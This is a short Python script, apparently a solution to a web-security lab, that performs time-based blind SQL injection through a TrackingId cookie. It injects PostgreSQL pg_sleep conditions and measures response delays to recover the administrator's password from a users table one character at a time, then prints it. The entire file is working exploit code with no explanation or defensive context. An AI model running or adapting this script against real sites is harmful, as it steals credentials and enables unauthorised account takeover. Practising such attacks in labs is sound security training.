import requests

url = "/filter"
base = ""

def is_true(condition):
    headers = {"Cookie":"TrackingId=" + base + "'||" + condition + "--"}
    r = requests.get(url, params={"category": "Lifestyle"}, headers=headers)
    return r.elapsed.total_seconds() > 5

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

for pos in range(1,21):
    for ch in alphabet:
        cond = f"(SELECT CASE WHEN (SUBSTR(password,{pos},1)='{ch}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')"
        if is_true(cond):
            password += ch
            print(pos, ch, "->",password)
            break

print("PASSWORD:", password)
